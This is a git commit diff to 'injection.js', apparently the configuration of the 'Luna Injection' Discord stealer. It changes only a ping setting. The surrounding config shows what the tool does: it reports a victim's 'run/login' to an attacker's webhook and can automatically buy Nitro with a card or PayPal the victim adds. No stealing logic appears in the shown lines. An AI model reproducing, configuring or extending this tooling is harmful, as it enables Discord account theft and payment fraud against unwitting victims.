62de99c974e35dfc70c26191cdbe7c0ee4665c09
Smug <99215486+Smug246@users.noreply.github.com>
2022-06-02 18:39:51 +0100

    Update injection.js

--- injection.js
+++ injection.js
@@ -12,7 +12,7 @@ const config = {
   webhook_protector_key: '%WEBHOOK_KEY%', //your base32 encoded key IF you're using https://github.com/Rdimo/Discord-Webhook-Protector
   auto_buy_nitro: false, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
   ping_on_run: true, //sends whatever value you have in ping_val when you get a run/login
-  ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
+  ping_val: '@here', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
   embed_name: 'Luna Injection', //name of the webhook thats gonna send the info
   embed_icon: 'https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 5639644, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
